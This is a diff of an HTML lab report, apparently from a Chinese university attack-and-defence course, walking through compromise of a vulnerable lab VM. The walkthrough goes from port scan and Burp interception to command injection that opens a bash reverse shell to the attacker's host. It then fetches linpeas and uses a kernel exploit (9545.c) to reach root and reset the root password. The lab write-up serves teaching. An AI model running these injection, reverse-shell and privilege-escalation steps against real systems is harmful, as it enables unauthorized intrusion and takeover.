@@ -3244,7 +3244,7 @@
 
 <p>Network Atk&amp;Def lab3 241840273 杨良灼</p>
 <p>查询攻击机 IP.</p>
-<pre><code>└─$ sudo ifconfig
+<div class="highlight"><pre><span></span><code>└─$ sudo ifconfig
 eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
         inet 10.0.2.4  netmask 255.255.255.0  broadcast 10.0.2.255
         inet6 fe80::9d17:dec1:4341:a804  prefixlen 64  scopeid 0x20&lt;link&gt;
@@ -3262,10 +3262,9 @@ lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
         RX errors 0  dropped 0  overruns 0  frame 0
         TX packets 8  bytes 480 (480.0 B)
         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
-
-</code></pre>
+</code></pre></div>
 <p>端口扫描.</p>
-<pre><code>└─$ sudo nmap -p22,80,111,443,631,3306 -sV 10.0.2.15
+<div class="highlight"><pre><span></span><code>└─$ sudo nmap -p22,80,111,443,631,3306 -sV 10.0.2.15
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-20 07:55 EDT
 Nmap scan report for 10.0.2.15
 Host is up (0.000037s latency).
@@ -3280,14 +3279,14 @@ PORT     STATE  SERVICE VERSION
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 13.39 seconds
-</code></pre>
+</code></pre></div>
 <p>使用 Burp Suite 工具：</p>
 <p><img alt="3-1" src="../3-1.png" /></p>
 <p>点击 Open browser 打开后 URL 输入&lt;靶机IP&gt;/index.php</p>
 <p><img alt="3-2" src="../3-2.png" /></p>
 <p>打开拦截（Intercept off -&gt; Intercept on）</p>
 <p>随便输入什么发现其拦截得到了 username（<code>uname</code>） 和 password（<code>psw</code>） 参数</p>
-<pre><code>POST /index.php HTTP/1.1
+<div class="highlight"><pre><span></span><code>POST /index.php HTTP/1.1
 Host: 10.0.2.15
 Content-Length: 38
 Cache-Control: max-age=0
@@ -3302,7 +3301,7 @@ Accept-Encoding: gzip, deflate, br
 Connection: keep-alive
 
 uname=123456&amp;psw=114514&amp;btnLogin=Login
-</code></pre>
+</code></pre></div>
 <p>故而 username 应存在 SQL 注入漏洞。</p>
 <p><img alt="3-3" src="../3-3.png" /></p>
 <p>输入 <code>&lt;IP 地址&gt;</code>.</p>
@@ -3312,46 +3311,46 @@ uname=123456&amp;psw=114514&amp;btnLogin=Login
 <p>得到了用户名 <code>apache</code></p>
 <p>接下来进行反弹 Shell，首先随意设置一个无用端口作为监听端口，比如 <code>3433</code>：</p>
 <p>主机终端执行 <code>nc -lvvp 3433</code></p>
-<pre><code>└─$ nc -lvvp 3433                                                                                                                                          
+<div class="highlight"><pre><span></span><code>└─$ nc -lvvp 3433                                                                                                                                          
 listening on [any] 3433 ...
-</code></pre>
+</code></pre></div>
 <p>然后提交 <code>10.0.2.15; bash -i &gt;&amp; /dev/tcp/10.0.2.4/3433 0&gt;&amp;1</code>，监听端口处得到信息：</p>
-<pre><code>└─$ nc -lvvp 3433                                                                                                                                          
+<div class="highlight"><pre><span></span><code>└─$ nc -lvvp 3433                                                                                                                                          
 listening on [any] 3433 ...
 Warning: forward host lookup failed for bogon: Unknown host
 connect to [10.0.2.4] from bogon [10.0.2.15] 32769
 bash: no job control in this shell
 bash-3.00$ 
-</code></pre>
+</code></pre></div>
 <p>尝试执行 <code>whoami</code> 成功得到 <code>apache</code>：</p>
-<pre><code>bash-3.00$ whoami
+<div class="highlight"><pre><span></span><code>bash-3.00$ whoami
 apache
-</code></pre>
+</code></pre></div>
 <p>此时已得到其权限，接下来尝试提权.</p>
 <p>下载得到 linpeas.sh 文件，利用 python 启动一个外部服务器，将其从主机传入靶机.</p>
-<pre><code>└─$ python -m http.server 1142
+<div class="highlight"><pre><span></span><code>└─$ python -m http.server 1142
 
 Serving HTTP on 0.0.0.0 port 1142 (http://0.0.0.0:1142/) ...
-</code></pre>
+</code></pre></div>
 <p>通过浏览器输入 URL <code>http://localhost:1142/</code> 查询文件路径，并防止好 linpeas.sh 文件，随即下载：</p>
-<pre><code>bash-3.00$ pwd
+<div class="highlight"><pre><span></span><code>bash-3.00$ pwd
 /tmp
 bash-3.00$ wget http://10.0.2.4:1142/Public/linpeas.sh
-</code></pre>
+</code></pre></div>
 <p>查询文件：</p>
-<pre><code>bash-3.00$ ls -l
+<div class="highlight"><pre><span></span><code>bash-3.00$ ls -l
 total 944
 -rw-r--r--  1 apache apache 961834 Oct 14 04:26 linpeas.sh
-</code></pre>
+</code></pre></div>
 <p>下载完毕后，发现文件权限不足，将该文件的权限改为可执行，并执行.</p>
-<pre><code>bash-3.00$ chmod a+x linpeas.sh
+<div class="highlight"><pre><span></span><code>bash-3.00$ chmod a+x linpeas.sh
 bash-3.00$ ls -l
 total 944
 -rwxr-xr-x  1 apache apache 961834 Oct 14 04:26 linpeas.sh
 bash-3.00$ ./linpeas.sh
-</code></pre>
+</code></pre></div>
 <p>等待片刻后，注意到其操作系统是 Linux2.6 CentOS，比较古老.</p>
-<pre><code>╔══════════╣ Operative system
+<div class="highlight"><pre><span></span><code>╔══════════╣ Operative system
 ╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#kernel-exploits                                                           
 Linux version 2.6.9-55.EL (mockbuild@builder6.centos.org) (gcc version 3.4.6 20060404 (Red Hat 3.4.6-8)) #1 Wed May 2 13:52:16 EDT 2007                     
 LSB Version:    :core-3.0-ia32:core-3.0-noarch:graphics-3.0-ia32:graphics-3.0-noarch
@@ -3359,28 +3358,28 @@ Distributor ID: CentOS
 Description:    CentOS release 4.5 (Final)
 Release:        4.5
 Codename:       Final
-</code></pre>
+</code></pre></div>
 <p>尝试在 <code>https://www.exploit-db.com/</code> 和 <code>searchexpolit</code> 里搜索其漏洞及工具：</p>
 <p><img alt="3-6" src="../3-6.png" /></p>
-<pre><code>└─$ searchsploit linux 2.6 centos
+<div class="highlight"><pre><span></span><code>└─$ searchsploit linux 2.6 centos
 -------------------------------------------------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                                                            |  Path                           
 -------------------------------------------------------------------------------------------------------------------------- ---------------------------------
-Linux Kernel 2.4.x/2.6.x (CentOS 4.8/5.3 / RHEL 4.8/5.3 / SuSE 10 SP2/11 / Ubuntu 8.10) (PPC) - 'sock_sendpage()' Local P | linux/local/9545.c
-Linux Kernel 2.4/2.6 (RedHat Linux 9 / Fedora Core 4 &lt; 11 / Whitebox 4 / CentOS 4) - 'sock_sendpage()' Ring0 Privilege Es | linux/local/9479.c
-Linux Kernel 2.6 &lt; 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedora Core 4/5/6 x86) - 'ip_append_data()' Ring0 Privilege Esc | linux_x86/local/9542.c
-Linux Kernel 2.6.32 &lt; 3.x (CentOS 5/6) - 'PERF_EVENTS' Local Privilege Escalation (1)                                     | linux/local/25444.c
-Linux Kernel 2.6.x / 3.10.x / 4.14.x (RedHat / Debian / CentOS) (x64) - 'Mutagen Astronomy' Local Privilege Escalation    | linux_x86-64/local/45516.c
+Linux Kernel 2.4.x/2.6.x (CentOS 4.8/5.3 / RHEL 4.8/5.3 / SuSE 10 SP2/11 / Ubuntu 8.10) (PPC) - &#39;sock_sendpage()&#39; Local P | linux/local/9545.c
+Linux Kernel 2.4/2.6 (RedHat Linux 9 / Fedora Core 4 &lt; 11 / Whitebox 4 / CentOS 4) - &#39;sock_sendpage()&#39; Ring0 Privilege Es | linux/local/9479.c
+Linux Kernel 2.6 &lt; 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedora Core 4/5/6 x86) - &#39;ip_append_data()&#39; Ring0 Privilege Esc | linux_x86/local/9542.c
+Linux Kernel 2.6.32 &lt; 3.x (CentOS 5/6) - &#39;PERF_EVENTS&#39; Local Privilege Escalation (1)                                     | linux/local/25444.c
+Linux Kernel 2.6.x / 3.10.x / 4.14.x (RedHat / Debian / CentOS) (x64) - &#39;Mutagen Astronomy&#39; Local Privilege Escalation    | linux_x86-64/local/45516.c
 -------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Shellcodes: No Results 
-</code></pre>
+</code></pre></div>
 <p>这里使用 9545.c 这个脚本：</p>
 <p>查一下有没有 gcc，答案是有，那么就可以直接下载 c 脚本文件在本地编译运行.</p>
-<pre><code>bash-3.00$ gcc
+<div class="highlight"><pre><span></span><code>bash-3.00$ gcc
 gcc: no input files
-</code></pre>
+</code></pre></div>
 <p>将文件下载过来，然后执行获取权限并修改密码.</p>
-<pre><code>bash-3.00$ chmod 777 9545.c
+<div class="highlight"><pre><span></span><code>bash-3.00$ chmod 777 9545.c
 bash-3.00$ gcc -o exp 9545.c
 9545.c:376:28: warning: no newline at end of file
 bash-3.00$ ./exp
@@ -3392,8 +3391,7 @@ New UNIX password: s0aked1020
 Retype new UNIX password: s0aked1020
 Changing password for user root.
 passwd: all authentication tokens updated successfully.
-
-</code></pre>
+</code></pre></div>
 <p>登陆靶机成功.</p>
 
 
